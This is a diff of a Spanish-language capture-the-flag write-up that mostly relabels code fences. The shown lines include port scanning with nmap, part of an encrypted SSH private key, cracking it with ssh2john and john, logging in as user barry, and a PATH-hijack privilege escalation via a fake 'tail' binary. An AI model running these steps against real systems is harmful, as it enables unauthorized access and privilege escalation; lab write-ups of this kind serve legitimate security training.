@@ -2,7 +2,7 @@
 
 ## Scanning
 
-```bash
+```shell
 nmap -sS -p- --min-rate 5000 -vvv --open -Pn -n -oG allports 10.10.0.151
 nmap -sC -sV -p 22,80 -Pn -n -oN targeted 10.10.0.151
 ```
@@ -78,7 +78,7 @@ Como nos dieron la pista de que se puede ingresar con ssh entonces buscaremos si
 Con barry encontramos resultados.
 
 ```
-Name: -----BEGIN RSA PRIVATE KEY-----
+-----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E
 
@@ -112,7 +112,7 @@ ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
 
 Vemos que esta encriptado pero podemos usar ssh2john para encontrar la contraseña necesaria para usar esta id_rsa.
 
-```bash
+```shell
 python2 /usr/share/john/ssh2john.py id_rsa > id_rsa.john
 
 john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
@@ -122,7 +122,7 @@ john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
 
 Ahora que encontramos la clave podemos ingresar al usuario barry.
 
-```bash
+```shell
 ssh barry@10.10.211.98 -i id_rsa
 ```
 
@@ -132,7 +132,7 @@ ssh barry@10.10.211.98 -i id_rsa
 
 ### SUID
 
-```bash
+```shell
 find / -perm -u=s -type f 2>/dev/null
 ```
 
@@ -146,7 +146,7 @@ pero no usa una ruta absoluta por lo que podriamos cambiar el path para que busq
 
 ![0816190701](0816190701.png)
 
-```
+```shell
 cd /tmp
 echo "/bin/bash" > tail
 chmod +x tail
